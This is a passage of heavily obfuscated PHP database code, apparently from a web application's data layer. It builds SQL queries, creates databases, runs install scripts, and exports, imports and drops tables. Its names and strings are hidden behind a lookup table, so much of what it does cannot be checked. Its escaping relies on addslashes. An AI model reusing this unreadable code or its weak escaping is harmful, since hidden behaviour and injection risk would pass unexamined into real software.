$û‘’œŒ[] = $this->parseKey($ú¡—û˜„); $¼®÷¢¹Ê[] = $this->parseValue($£€Äşâà); } } $ã§ïÊå = ($èìÀ™ò ? $¶¨ğ™Î—[919] : $¶¨ğ™Î—[920]) . $¶¨ğ™Î—[921] . $this->parseTable($¥üèòåÆ[$¶¨ğ™Î—[287]]) . $¶¨ğ™Î—[915] . implode($¶¨ğ™Î—[50], $û‘’œŒ) . $¶¨ğ™Î—[916] . implode($¶¨ğ™Î—[50], $¼®÷¢¹Ê) . $¶¨ğ™Î—[917]; $ã§ïÊå .= $this->parseLock(isset($¥üèòåÆ[$¶¨ğ™Î—[860]]) ? $¥üèòåÆ[$¶¨ğ™Î—[860]] : !1); $ã§ïÊå .= $this->parseComment(!empty($¥üèòåÆ[$¶¨ğ™Î—[362]]) ? $¥üèòåÆ[$¶¨ğ™Î—[362]] : $¶¨ğ™Î—[12]); return $this->execute($ã§ïÊå, $this->parseBind(!empty($¥üèòåÆ[$¶¨ğ™Î—[293]]) ? $¥üèòåÆ[$¶¨ğ™Î—[293]] : array())); } public function selectInsert($°¬ºÒ¹´, $İ•²ÌÌ, $ÁÆ½ªÄÜ = array()) { $›ëŒıá® =& $_SERVER[¯µç›È¢]; $this->model = $ÁÆ½ªÄÜ[$›ëŒıá®[289]]; if (is_string($°¬ºÒ¹´)) { $°¬ºÒ¹´ = explode($›ëŒıá®[50], $°¬ºÒ¹´); } array_walk($°¬ºÒ¹´, array($this, $›ëŒıá®[918])); $‚™ùì = $›ëŒıá®[1052] . $this->parseTable($İ•²ÌÌ) . $›ëŒıá®[915] . implode($›ëŒıá®[50], $°¬ºÒ¹´) . $›ëŒıá®[1030]; $‚™ùì .= $this->buildSelectSql($ÁÆ½ªÄÜ); return $this->execute($‚™ùì, $this->parseBind(!empty($ÁÆ½ªÄÜ[$›ëŒıá®[293]]) ? $ÁÆ½ªÄÜ[$›ëŒıá®[293]] : array())); } public function update($¿…âÊó„, $Å½ÁåëÉ) { $ÂîÌªÛÃ =& $_SERVER[¯µç›È¢]; $this->model = $Å½ÁåëÉ[$ÂîÌªÛÃ[289]]; $¼¦ˆé Û = $ÂîÌªÛÃ[1053] . $this->parseTable($Å½ÁåëÉ[$ÂîÌªÛÃ[287]]) . $this->parseSet($¿…âÊó„) . $this->parseWhere(!empty($Å½ÁåëÉ[$ÂîÌªÛÃ[283]]) ? $Å½ÁåëÉ[$ÂîÌªÛÃ[283]] : $ÂîÌªÛÃ[12]) . $this->parseOrder(!empty($Å½ÁåëÉ[$ÂîÌªÛÃ[373]]) ? $Å½ÁåëÉ[$ÂîÌªÛÃ[373]] : $ÂîÌªÛÃ[12]) . $this->parseLimit(!empty($Å½ÁåëÉ[$ÂîÌªÛÃ[300]]) ? $Å½ÁåëÉ[$ÂîÌªÛÃ[300]] : $ÂîÌªÛÃ[12]) . $this->parseLock(isset($Å½ÁåëÉ[$ÂîÌªÛÃ[860]]) ? $Å½ÁåëÉ[$ÂîÌªÛÃ[860]] : !1) . $this->parseComment(!empty($Å½ÁåëÉ[$ÂîÌªÛÃ[362]]) ? $Å½ÁåëÉ[$ÂîÌªÛÃ[362]] : $ÂîÌªÛÃ[12]); return $this->execute($¼¦ˆé Û, $this->parseBind(!empty($Å½ÁåëÉ[$ÂîÌªÛÃ[293]]) ? $Å½ÁåëÉ[$ÂîÌªÛÃ[293]] : array())); } public function delete($·Àà¬Ä‰ = array()) { $–Ú«ß“ =& $_SERVER[¯µç›È¢]; $this->model = $·Àà¬Ä‰[$–Ú«ß“[289]]; $ì™«Ö€“ = $–Ú«ß“[1054] . $this->parseTable($·Àà¬Ä‰[$–Ú«ß“[287]]) . $this->parseWhere(!empty($·Àà¬Ä‰[$–Ú«ß“[283]]) ? $·Àà¬Ä‰[$–Ú«ß“[283]] : $–Ú«ß“[12]) . $this->parseOrder(!empty($·Àà¬Ä‰[$–Ú«ß“[373]]) ? $·Àà¬Ä‰[$–Ú«ß“[373]] : $–Ú«ß“[12]) . $this->parseLimit(!empty($·Àà¬Ä‰[$–Ú«ß“[300]]) ? $·Àà¬Ä‰[$–Ú«ß“[300]] : $–Ú«ß“[12]) . $this->parseLock(isset($·Àà¬Ä‰[$–Ú«ß“[860]]) ? $·Àà¬Ä‰[$–Ú«ß“[860]] : !1) . $this->parseComment(!empty($·Àà¬Ä‰[$–Ú«ß“[362]]) ? $·Àà¬Ä‰[$–Ú«ß“[362]] : $–Ú«ß“[12]); return $this->execute($ì™«Ö€“, $this->parseBind(!empty($·Àà¬Ä‰[$–Ú«ß“[293]]) ? $·Àà¬Ä‰[$–Ú«ß“[293]] : array())); } public function select($éÊ¡‚¥å = array()) { $ĞÚùÍäñ =& $_SERVER[¯µç›È¢]; $this->model = $éÊ¡‚¥å[$ĞÚùÍäñ[289]]; $®¸’’›Œ = $this->buildSelectSql($éÊ¡‚¥å); $›Ë®Úğ = isset($éÊ¡‚¥å[$ĞÚùÍäñ[357]]) ? $éÊ¡‚¥å[$ĞÚùÍäñ[357]] : !1; if ($›Ë®Úğ) { $ßŞÖüí¼ = is_string($›Ë®Úğ[$ĞÚùÍäñ[105]]) ? $›Ë®Úğ[$ĞÚùÍäñ[105]] : $ĞÚùÍäñ[1055] . md5($®¸’’›Œ); $ÌÄšåí = think_cache($ßŞÖüí¼, $ĞÚùÍäñ[12], $›Ë®Úğ); if (!1 !== $ÌÄšåí) { return $ÌÄšåí; } } $ñèàÒÎ” = $this->query($®¸’’›Œ, $this->parseBind(!empty($éÊ¡‚¥å[$ĞÚùÍäñ[293]]) ? $éÊ¡‚¥å[$ĞÚùÍäñ[293]] : array())); if ($›Ë®Úğ && !1 !== $ñèàÒÎ”) { think_cache($ßŞÖüí¼, $ñèàÒÎ”, $›Ë®Úğ); } return $ñèàÒÎ”; } public function buildSelectSql($Ëı„Ô = array()) { $»›ÔÜõØ =& $_SERVER[¯µç›È¢]; if (isset($Ëı„Ô[$»›ÔÜõØ[361]])) { if (strpos($Ëı„Ô[$»›ÔÜõØ[361]], $»›ÔÜõØ[50])) { list($°°òõóß, $â«¼«şØ) = explode($»›ÔÜõØ[50], $Ëı„Ô[$»›ÔÜõØ[361]]); } else { $°°òõóß = $Ëı„Ô[$»›ÔÜõØ[361]]; } $°°òõóß = $°°òõóß ? $°°òõóß : 1; $â«¼«şØ = isset($â«¼«şØ) ? $â«¼«şØ : (is_numeric($Ëı„Ô[$»›ÔÜõØ[300]]) ? $Ëı„Ô[$»›ÔÜõØ[300]] : 20); $ò¡ü¤½ = $â«¼«şØ * ((int) $°°òõóß - 1); $Ëı„Ô[$»›ÔÜõØ[300]] = $ò¡ü¤½ . $»›ÔÜõØ[50] . $â«¼«şØ; } if (think_config($»›ÔÜõØ[1056])) { $ÓŠ¾ñ…¤ = $»›ÔÜõØ[1057] . md5(serialize($Ëı„Ô)); $ßâÚ€æ = think_cache($ÓŠ¾ñ…¤); if ($ßâÚ€æ) { return $ßâÚ€æ; } } $£¸Áô = $this->parseSql($this->selectSql, $Ëı„Ô); $£¸Áô .= $this->parseLock(isset($Ëı„Ô[$»›ÔÜõØ[860]]) ? $Ëı„Ô[$»›ÔÜõØ[860]] : !1); if (isset($ÓŠ¾ñ…¤)) { think_cache($ÓŠ¾ñ…¤, $£¸Áô); } return $£¸Áô; } public function parseSql($×â‚É¯ı, $³ñ Á ¶ = array()) { $ïÅÔ–‰ =& $_SERVER[¯µç›È¢]; $×â‚É¯ı = str_replace(array($ïÅÔ–‰[1058], $ïÅÔ–‰[1059], $ïÅÔ–‰[1060], $ïÅÔ–‰[1061], $ïÅÔ–‰[1062], $ïÅÔ–‰[1063], $ïÅÔ–‰[1064], $ïÅÔ–‰[1065], $ïÅÔ–‰[1066], $ïÅÔ–‰[1067], $ïÅÔ–‰[1068]), array($this->parseTable("{$³ñ Á ¶[$ïÅÔ–‰[287]]}"), $this->parseDistinct(isset($³ñ Á ¶[$ïÅÔ–‰[1069]]) ? $³ñ Á ¶[$ïÅÔ–‰[1069]] : !1), $this->parseField(!empty($³ñ Á ¶[$ïÅÔ–‰[281]]) ? $³ñ Á ¶[$ïÅÔ–‰[281]] : $ïÅÔ–‰[195]), $this->parseJoin(!empty($³ñ Á ¶[$ïÅÔ–‰[290]]) ? $³ñ Á ¶[$ïÅÔ–‰[290]] : $ïÅÔ–‰[12]), $this->parseWhere(!empty($³ñ Á ¶[$ïÅÔ–‰[283]]) ? $³ñ Á ¶[$ïÅÔ–‰[283]] : $ïÅÔ–‰[12]), $this->parseGroup(!empty($³ñ Á ¶[$ïÅÔ–‰[520]]) ? $³ñ Á ¶[$ïÅÔ–‰[520]] : $ïÅÔ–‰[12]), $this->parseHaving(!empty($³ñ Á ¶[$ïÅÔ–‰[1070]]) ? $³ñ Á ¶[$ïÅÔ–‰[1070]] : $ïÅÔ–‰[12]), $this->parseOrder(!empty($³ñ Á ¶[$ïÅÔ–‰[373]]) ? $³ñ Á ¶[$ïÅÔ–‰[373]] : $ïÅÔ–‰[12]), $this->parseLimit(!empty($³ñ Á ¶[$ïÅÔ–‰[300]]) ? $³ñ Á ¶[$ïÅÔ–‰[300]] : $ïÅÔ–‰[12]), $this->parseUnion(!empty($³ñ Á ¶[$ïÅÔ–‰[355]]) ? $³ñ Á ¶[$ïÅÔ–‰[355]] : $ïÅÔ–‰[12]), $this->parseComment(!empty($³ñ Á ¶[$ïÅÔ–‰[362]]) ? $³ñ Á ¶[$ïÅÔ–‰[362]] : $ïÅÔ–‰[12])), $×â‚É¯ı); return $×â‚É¯ı; } public function getLastSql($µÑÉí¡† = '') { return $µÑÉí¡† ? $this->modelSql[$µÑÉí¡†] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ÔÅ¹Œ¯œ) { return addslashes($ÔÅ¹Œ¯œ); } public function setModel($ğæ¹°×Š) { $this->model = $ğæ¹°×Š; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($òãÃ¡øî = array()) { $õñ–’Ä½ =& $_SERVER[¯µç›È¢]; if (empty($òãÃ¡øî)) { $òãÃ¡øî = $GLOBALS[$õñ–’Ä½[6]][$õñ–’Ä½[21]]; } $this->database = $òãÃ¡øî; } public function model($›¥È¾½ = '') { return new ModelBase($›¥È¾½, $_SERVER[¯µç›È¢][12], $this->database); } public function db($ÙÑèü·Ï = false) { $Ó¦¬­şï =& $_SERVER[¯µç›È¢]; $ßââ¢—ı = array_change_key_case($this->database); if ($this->dbType() == $Ó¦¬­şï[13] || !$ÙÑèü·Ï) { return $this->model()->db(); } $ÔÏœñ‘ù = $ßââ¢—ı[$Ó¦¬­şï[984]]; $ßââ¢—ı[$Ó¦¬­şï[984]] = $Ó¦¬­şï[12]; if ($ßââ¢—ı[$Ó¦¬­şï[979]] == $Ó¦¬­şï[976]) { $ÓáºïÜÆ = $ßââ¢—ı[$Ó¦¬­şï[985]]; $ßââ¢—ı[$Ó¦¬­şï[985]] = substr($ÓáºïÜÆ, 0, strrpos($ÓáºïÜÆ, $Ó¦¬­şï[1071])); } $this->database = $ßââ¢—ı; $œòÜâ­Â = $this->model()->db(); try { $§ÚôÂ›Ç = $œòÜâ­Â->execute("\x73\150\x6f\x77\x20\x64\141\x74\141\x62\x61\x73\x65\x73\x20\154\x69\153\145\40\47{$ÔÏœñ‘ù}\x27"); } catch (Exception $©•¾«¥) { } if (!$§ÚôÂ›Ç) { $œòÜâ­Â->execute("\x63\162\145\141\164\x65\40\144\x61\164\x61\x62\141\x73\x65\x20\140{$ÔÏœñ‘ù}\140"); } $ßââ¢—ı[$Ó¦¬­şï[984]] = $ÔÏœñ‘ù; if ($ßââ¢—ı[$Ó¦¬­şï[979]] == $Ó¦¬­şï[976]) { $ßââ¢—ı[$Ó¦¬­şï[985]] .= $Ó¦¬­şï[1071] . $ÔÏœñ‘ù; } $this->database = $ßââ¢—ı; $œòÜâ­Â->execute("\x75\163\x65\x20\140{$ÔÏœñ‘ù}\x60"); return $œòÜâ­Â; } public function createTable($¯†’œåŒ, &$ñŠöı¯û) { $Æ±¥Û¨İ =& $_SERVER[¯µç›È¢]; if (!IO::exist($¯†’œåŒ)) { ActionCall($Æ±¥Û¨İ[1072], !0, 0); show_json(LNG($Æ±¥Û¨İ[1073]), !1); } $–ÕŸ¼Ø± = $this->model()->db(); $€ÚÀß‘á = sqlSplit(IO::getContent($¯†’œåŒ)); foreach ($€ÚÀß‘á as $­®õÀ¯Ç) { $œªÄ¦Âœ = stripos($­®õÀ¯Ç, $Æ±¥Û¨İ[1074]) === 0; if ($œªÄ¦Âœ) { $ñŠöı¯û->task[$Æ±¥Û¨İ[803]] += 1; } $–ÕŸ¼Ø±->execute($­®õÀ¯Ç); if ($œªÄ¦Âœ) { preg_match($Æ±¥Û¨İ[1075], $­®õÀ¯Ç, $ßìºŠŞ); $ñŠöı¯û->task[$Æ±¥Û¨İ[1076]] = $ßìºŠŞ[1]; $ñŠöı¯û->update(1); } } } public function insertTable($Çµ›™Öï, &$†Äø¦Šš) { $èİè’í§ =& $_SERVER[¯µç›È¢]; $…ÙÍ™¥Û = $this->model()->db(); $ÅíÀò‰ƒ = $¡Å€§· ? array($¡Å€§·) : $…ÙÍ™¥Û->getTables(); foreach ($Çµ›™Öï as $Ä¾ŞÎ¡Ç) { $¡Å€§· = basename($Ä¾ŞÎ¡Ç, $èİè’í§[805]); if (!in_array($¡Å€§·, $ÅíÀò‰ƒ)) { continue; } $†Äø¦Šš->task[$èİè’í§[1076]] = $¡Å€§·; if (get_filesize($Ä¾ŞÎ¡Ç) == 0) { continue; } $‘¶¸œ»Ü = $this->sqlToDb($Ä¾ŞÎ¡Ç, $†Äø¦Šš); if (!$‘¶¸œ»Ü) { ActionCall($èİè’í§[1072], !0, 0); show_json(LNG($èİè’í§[1077]) . "\x5b{$¡Å€§·}\x5d", !1); } } } public function sqlFromDb($Áúì¿ğË, $‘Üö©é, &$šà²ÈÄ©, $¼…“ø” = '') { if ($šà²ÈÄ©) { $šà²ÈÄ©->task[$_SERVER[¯µç›È¢][1076]] = $Áúì¿ğË; } $®Ûş²¼Œ = $this->model($Áúì¿ğË); $şÄøŠ‚ˆ = 0; $àºûœà¥ = 0; $Òö¼—Ì– = 10000; $‘ºÜ­ôè = fopen($‘Üö©é, $_SERVER[¯µç›È¢][1078]); $›Û¼ğä = $®Ûş²¼Œ->getPk(); $‘×‰áùÂ = $®Ûş²¼Œ->getDbFields(); $óç¢ŞÄ— = $_SERVER[¯µç›È¢][12]; if ($GLOBALS[$_SERVER[¯µç›È¢][804]] && in_array($Áúì¿ğË, array($_SERVER[¯µç›È¢][1079], $_SERVER[¯µç›È¢][1080]))) { $óç¢ŞÄ— = $Áúì¿ğË; } do { $úÀ‘Ø­× = array($›Û¼ğä => array($_SERVER[¯µç›È¢][1026], $àºûœà¥)); $íƒµï›æ = $®Ûş²¼Œ->where($úÀ‘Ø­×)->field($‘×‰áùÂ)->order($›Û¼ğä . $_SERVER[¯µç›È¢][1081])->limit($Òö¼—Ì–)->select(); $íƒµï›æ = !empty($íƒµï›æ) ? $íƒµï›æ : array(); if (!($·£ìÀã = count($íƒµï›æ))) { break; } $ó°È¾ıé = end($íƒµï›æ); $àºûœà¥ = $ó°È¾ıé[$›Û¼ğä]; $ ¨Ì¼ë¿ = array(); foreach ($íƒµï›æ as $‹§ã˜°) { if ($óç¢ŞÄ—) { if ($Áúì¿ğË == $_SERVER[¯µç›È¢][1079]) { if ($‹§ã˜°[$_SERVER[¯µç›È¢][33]] == $_SERVER[¯µç›È¢][1082]) { $õî¬ÛıÊ = json_decode($‹§ã˜°[$_SERVER[¯µç›È¢][382]], !0); if ($õî¬ÛıÊ[$_SERVER[¯µç›È¢][32]] == $GLOBALS[$_SERVER[¯µç›È¢][804]] && $õî¬ÛıÊ[$_SERVER[¯µç›È¢][767]] != 1) { continue; } } } else { if ($‹§ã˜°[$_SERVER[¯µç›È¢][33]] == $_SERVER[¯µç›È¢][1083] && $‹§ã˜°[$_SERVER[¯µç›È¢][105]] == $_SERVER[¯µç›È¢][796]) { continue; } } } if ($¼…“ø”) { $‹§ã˜°[$_SERVER[¯µç›È¢][88]] = "\173\x69\157\72{$¼…“ø”}\x7d" . substr($‹§ã˜°[$_SERVER[¯µç›È¢][88]], strlen("\173\151\157\x3a{$‹§ã˜°[$_SERVER[¯µç›È¢][834]]}\x7d")); $‹§ã˜°[$_SERVER[¯µç›È¢][834]] = $¼…“ø”; } $ ¨Ì¼ë¿[] = $_SERVER[¯µç›È¢][1084] . $this->sqlEncode($‹§ã˜°) . $_SERVER[¯µç›È¢][1085]; } $ôÎãÊ¥ = "\111\x4e\x53\105\122\x54\x20\111\x4e\x54\117\40\140{$Áúì¿ğË}\140\x20\50\x60" . implode($_SERVER[¯µç›È¢][1086], $‘×‰áùÂ) . $_SERVER[¯µç›È¢][1087]; fwrite($‘ºÜ­ôè, $ôÎãÊ¥ . implode($_SERVER[¯µç›È¢][1088], $ ¨Ì¼ë¿) . $_SERVER[¯µç›È¢][81] . PHP_EOL); $şÄøŠ‚ˆ += $·£ìÀã; if ($šà²ÈÄ©) { $šà²ÈÄ©->update($·£ìÀã); } } while ($Òö¼—Ì– == $·£ìÀã); fclose($‘ºÜ­ôè); return $şÄøŠ‚ˆ; } public function sqlToDb($Íø¦Ã†ñ, &$°°üÄºß) { $ğÉÖîÏ =& $_SERVER[¯µç›È¢]; $ñÈ£¤© = $this->model()->db(); $æ„İ†¯ß = @fopen($Íø¦Ã†ñ, $ğÉÖîÏ[1089]); if (!$æ„İ†¯ß) { return !1; } $º¤¯ÒÔ³ = 0; $ŒåıÓ•» = $ğÉÖîÏ[12]; $È‡ÅÏß = array(); $ÈüÊÓ•³ = $this->dbType(); $óıŠƒ“÷ = $ÈüÊÓ•³ == $ğÉÖîÏ[13] ? 500 : 2000; $‚‰ö·äÔ = basename($Íø¦Ã†ñ, $ğÉÖîÏ[805]); $ï™÷Ç = 0; $šĞÉë×ä = 4194304 - 104858; $“şõèÓğ = 1000000 - 104858; while (!feof($æ„İ†¯ß)) { $™‡á‰Õ´ = trim(fgets($æ„İ†¯ß)); if (!$™‡á‰Õ´) { continue; } $ûÉÃ¸ËÆ = $this->sqlDecode($™‡á‰Õ´, $ÈüÊÓ•³, $‚‰ö·äÔ); if (stripos($ûÉÃ¸ËÆ, $ğÉÖîÏ[363]) === 0) { if (!$ŒåıÓ•») { $ŒåıÓ•» = $ûÉÃ¸ËÆ . $ğÉÖîÏ[53]; } continue; } if ($°°üÄºß) { $°°üÄºß->task[$ğÉÖîÏ[803]] += 1; } $º¤¯ÒÔ³++; $È‡ÅÏß[] = rtrim(rtrim(trim($ûÉÃ¸ËÆ), $ğÉÖîÏ[50]), $ğÉÖîÏ[81]); $–ÒÂÁ‘Í = null; $Ê³§ùá = strlen($ûÉÃ¸ËÆ); $ï™÷Ç += $Ê³§ùá; if ($ï™÷Ç >= ($óıŠƒ“÷ == 500 ? $“şõèÓğ : $šĞÉë×ä)) { $–ÒÂÁ‘Í = array_pop($È‡ÅÏß); if ($º¤¯ÒÔ³ > 1) { $º¤¯ÒÔ³--; } } if ($º¤¯ÒÔ³ >= $óıŠƒ“÷ || $–ÒÂÁ‘Í) { $ûÉÃ¸ËÆ = $ŒåıÓ•» . implode($ğÉÖîÏ[50], $È‡ÅÏß); if (!$ñÈ£¤©->execute($ûÉÃ¸ËÆ)) { return !1; } if ($°°üÄºß) { $°°üÄºß->update($º¤¯ÒÔ³); } $È‡ÅÏß = array(); $º¤¯ÒÔ³ = 0; $ï™÷Ç = 0; if ($–ÒÂÁ‘Í) { $È‡ÅÏß = array($–ÒÂÁ‘Í); $º¤¯ÒÔ³ = 1; $ï™÷Ç = $Ê³§ùá; } } } fclose($æ„İ†¯ß); if (!empty($È‡ÅÏß)) { $ûÉÃ¸ËÆ = $ŒåıÓ•» . implode($ğÉÖîÏ[50], $È‡ÅÏß); if (!$ñÈ£¤©->execute($ûÉÃ¸ËÆ)) { return !1; } if ($°°üÄºß) { $°°üÄºß->update($º¤¯ÒÔ³); } } return !0; } public function dropTable($¶Î³áÔú = null) { $ÅÀë˜¸ä = $this->model()->db(); $Å»ÏÓä = $¶Î³áÔú ? array($¶Î³áÔú) : $ÅÀë˜¸ä->getTables(); if (!$Å»ÏÓä) { return; } foreach ($Å»ÏÓä as $¶Î³áÔú) { if ($¶Î³áÔú) { $¶Î³áÔú = strtolower($¶Î³áÔú); } else { continue; } $ÅÀë˜¸ä->execute("\144\x72\x6f\x70\40\x74\x61\142\x6c\145\40\151\146\40\x65\x78\x69\x73\164\x73\40\x60{$¶Î³áÔú}\x60"); } } private function sqlEncode($¤çüäÉÊ) { $„Å“©Ü„ =& $_SERVER[¯µç›È¢]; $ÅË²Åİ± = array(); foreach ($¤çüäÉÊ as $Ÿ”óÒ¶Ñ) { if (is_array($Ÿ”óÒ¶Ñ)) { $Ÿ”óÒ¶Ñ = json_encode_force($Ÿ”óÒ¶Ñ); } $Ÿ”óÒ¶Ñ = addslashes($Ÿ”óÒ¶Ñ); $Ÿ”óÒ¶Ñ = str_replace(array($„Å“©Ü„[1090], $„Å“©Ü„[66]), array($„Å“©Ü„[1091], $„Å“©Ü„[1092]), $Ÿ”óÒ¶Ñ); $ÅË²Åİ±[] = str_replace($„Å“©Ü„[58], $„Å“©Ü„[1093], $Ÿ”óÒ¶Ñ); } return $„Å“©Ü„[58] . implode($„Å“©Ü„[1094], $ÅË²Åİ±) . $„Å“©Ü„[58]; } private function sqlDecode($„ÂÒäĞë, $³‘ôãê†, $å•ú•Ü÷ = '') { $ÌúÄêÄ  =& $_SERVER[¯µç›È¢]; $„ÂÒäĞë = str_replace(array($ÌúÄêÄ [1091], $ÌúÄêÄ [1092]), array($ÌúÄêÄ [1090], $ÌúÄêÄ [66]), $„ÂÒäĞë); if ($³‘ôãê† == $ÌúÄêÄ [13]) { return $å•ú•Ü÷ != $ÌúÄêÄ [1095] ? stripslashes($„ÂÒäĞë) : $„ÂÒäĞë; } if ($å•ú•Ü÷ == $ÌúÄêÄ [1095]) { $„ÂÒäĞë = str_replace($ÌúÄêÄ [1096], $ÌúÄêÄ [129], stripslashes($„ÂÒäĞë)); } return $„ÂÒäĞë; } public function getSqlFile($ÌİæçÉƒ = '') { $Í¤¥Ğ§ =& $_SERVER[¯µç›È¢]; $Í…ë¾öş = $this->dbType(!0); $ûÊéò¸ß = CONTROLLER_DIR . "\151\x6e\x73\164\141\154\x6c\57\144\141\x74\x61\x2f{$Í…ë¾öş}\56\x73\161\x6c"; $ëÈ«°¿™ = file_get_contents($ûÊéò¸ß); $¡­õÀöŞ = $Í¤¥Ğ§[1097] . ($Í…ë¾öş == $Í¤¥Ğ§[821] ? $Í¤¥Ğ§[1098] : $Í¤¥Ğ§[1099]) . $Í¤¥Ğ§[1100]; preg_match_all($¡­õÀöŞ, $ëÈ«°¿™, $Å°¹Æü¢); $•ÂøÚéÁ = $Å°¹Æü¢[1]; $ÃŠÚ‰İâ = $this->model()->db(); $€•‰¿áº = $ÃŠÚ‰İâ->getTables(); $…èéüùÌ = TEMP_FILES . $Í¤¥Ğ§[1101] . date($Í¤¥Ğ§[768]) . $Í¤¥Ğ§[8]; del_dir($…èéüùÌ); mk_dir($…èéüùÌ); $Æ©ÄÍÑê = $…èéüùÌ . $Í¤¥Ğ§[1102]; $®ÑÍ¯È· = $…èéüùÌ . $Í¤¥Ğ§[1103]; $ÎÂ³¦ÈÃ = $Í…ë¾öş == $Í¤¥Ğ§[13] ? $Í¤¥Ğ§[821] : $Í¤¥Ğ§[13]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\x74\x61\x6c\x6c\x2f\144\x61\x74\x61\x2f{$ÎÂ³¦ÈÃ}\x2e\163\x71\154", $…èéüùÌ); @touch($…èéüùÌ . $Í…ë¾öş . $Í¤¥Ğ§[805]); $ç™à‹™¦ = fopen($Æ©ÄÍÑê, $Í¤¥Ğ§[1078]); $à‡ÂÈ–§ = fopen($®ÑÍ¯È·, $Í¤¥Ğ§[1078]); if ($Í…ë¾öş == $Í¤¥Ğ§[13]) { $€•‰¿áº = array_diff($€•‰¿áº, array($Í¤¥Ğ§[801], $Í¤¥Ğ§[802])); $ÖêíÃëê = array($Í¤¥Ğ§[1104], $Í¤¥Ğ§[1105], $Í¤¥Ğ§[1106]); fwrite($à‡ÂÈ–§, implode(PHP_EOL, $ÖêíÃëê) . PHP_EOL . PHP_EOL); foreach ($€•‰¿áº as $ºåÉ¯¼) { $²Ç€àÂî = $this->sqlFromSqlite($ºåÉ¯¼); if (!$²Ç€àÂî[$Í¤¥Ğ§[13]]) { continue; } fwrite($à‡ÂÈ–§, $²Ç€àÂî[$Í¤¥Ğ§[13]] . PHP_EOL . PHP_EOL); if (!in_array($ºåÉ¯¼, $•ÂøÚéÁ)) { fwrite($ç™à‹™¦, $²Ç€àÂî[$Í¤¥Ğ§[821]] . PHP_EOL . PHP_EOL); } } } else { foreach ($€•‰¿áº as $ºåÉ¯¼) { $²Ç€àÂî = $this->sqlFromMysql($ºåÉ¯¼); if (!$²Ç€àÂî[$Í¤¥Ğ§[821]]) { continue; } fwrite($ç™à‹™¦, $²Ç€àÂî[$Í¤¥Ğ§[821]] . PHP_EOL . PHP_EOL); if (!in_array($ºåÉ¯¼, $•ÂøÚéÁ)) { fwrite($à‡ÂÈ–§, $²Ç€àÂî[$Í¤¥Ğ§[13]] . PHP_EOL . PHP_EOL); } } } fclose($ç™à‹™¦); fclose($à‡ÂÈ–§); $ëÈ«°¿™ = array($Í¤¥Ğ§[821] => $Æ©ÄÍÑê, $Í¤¥Ğ§[13] => $®ÑÍ¯È·); return $ÌİæçÉƒ ? $ëÈ«°¿™[$ÌİæçÉƒ] : $ëÈ«°¿™; } public function dbType($ÌÚªÖàŞ = false) { $óîŠ•èŠ =& $_SERVER[¯µç›È¢]; $ûùêÍñ = $ÌÚªÖàŞ ? $GLOBALS[$óîŠ•èŠ[6]][$óîŠ•èŠ[21]] : $this->database; $ûùêÍñ = array_change_key_case($ûùêÍñ); $‹„İÃıÏ = $ûùêÍñ[$óîŠ•èŠ[979]]; if ($‹„İÃıÏ == $óîŠ•èŠ[976]) { $ñÇ×‘Ô = explode($óîŠ•èŠ[4], $ûùêÍñ[$óîŠ•èŠ[985]]); $‹„İÃıÏ = $ñÇ×‘Ô[0]; } $å½³À£¦ = array($óîŠ•èŠ[1107] => $óîŠ•èŠ[13], $óîŠ•èŠ[924] => $óîŠ•èŠ[821]); if (isset($å½³À£¦[$‹„İÃıÏ])) { $‹„İÃıÏ = $å½³À£¦[$‹„İÃıÏ]; } return $‹„İÃıÏ; } public function sqlFromMysql($ë¬ˆóÖú, $’ş®›ªÅ = '') { $ºäËù‡Ç =& $_SERVER[¯µç›È¢]; $ù¡›’ìå = $this->model()->db(); $ËÑù®— = $ù¡›’ìå->query($ºäËù‡Ç[1108] . $ë¬ˆóÖú . $ºäËù‡Ç[393]); if (!$ËÑù®— || !$ËÑù®—[0]) { return !1; } $õ¥àì‡÷ = _get($ËÑù®—[0], $ºäËù‡Ç[1109], $ºäËù‡Ç[12]); if (!$õ¥àì‡÷) { return !1; } $æ‘“øÁ¨ = "\104\122\117\120\40\124\101\x42\114\105\x20\111\106\40\x45\x58\x49\123\124\123\x20\140{$ë¬ˆóÖú}\x60\73" . PHP_EOL . $õ¥àì‡÷ . $ºäËù‡Ç[81]; if ($’ş®›ªÅ && $’ş®›ªÅ == $ºäËù‡Ç[821]) { return $æ‘“øÁ¨; } $¸Ïş¸€ = array_change_key_case($GLOBALS[$ºäËù‡Ç[6]][$ºäËù‡Ç[21]]); $œ™±³´ = $¸Ïş¸€[$ºäËù‡Ç[984]]; $ÌşÂ«¶Ï = $ºäËù‡Ç[1110] . $œ™±³´ . $ºäËù‡Ç[1111] . $ë¬ˆóÖú . $ºäËù‡Ç[58]; $„‰¢¿Ã³ = $ºäËù‡Ç[1112] . $ë¬ˆóÖú . $ºäËù‡Ç[912]; $Ğİ’¥¾† = $ù¡›’ìå->query($ÌşÂ«¶Ï); if (empty($Ğİ’¥¾†)) { $ÑêÒñ§¶ = array($ºäËù‡Ç[821] => $ºäËù‡Ç[12], $ºäËù‡Ç[13] => $ºäËù‡Ç[12]); return $’ş®›ªÅ ? $ÑêÒñ§¶[$’ş®›ªÅ] : $ÑêÒñ§¶; } $Êä‘œ±ğ = $ù¡›’ìå->query($„‰¢¿Ã³); $¤½’ôà = $ºäËù‡Ç[12]; $èŠ¦—Ë® = array(); foreach ($Êä‘œ±ğ as $„Í¤‹Æ) { if (!$¤½’ôà && $„Í¤‹Æ[$ºäËù‡Ç[1113]] == $ºäËù‡Ç[1114]) { $¤½’ôà = $„Í¤‹Æ[$ºäËù‡Ç[1115]]; } if (isset($èŠ¦—Ë®[$„Í¤‹Æ[$ºäËù‡Ç[1113]]])) { $èŠ¦—Ë®[$„Í¤‹Æ[$ºäËù‡Ç[1113]]][$ºäËù‡Ç[1116]][] = $„Í¤‹Æ[$ºäËù‡Ç[1115]]; continue; } $èŠ¦—Ë®[$„Í¤‹Æ[$ºäËù‡Ç[1113]]] = array($ºäËù‡Ç[1117] => $„Í¤‹Æ[$ºäËù‡Ç[1113]], $ºäËù‡Ç[1116] => array($„Í¤‹Æ[$ºäËù‡Ç[1115]]), $ºäËù‡Ç[1118] => $„Í¤‹Æ[$ºäËù‡Ç[1119]] == $ºäËù‡Ç[99] ? 0 : 1); } $ßœËÙï = array(); foreach ($èŠ¦—Ë® as $„Í¤‹Æ) { $¿ûœë¬ö = $„Í¤‹Æ[$ºäËù‡Ç[1117]] == 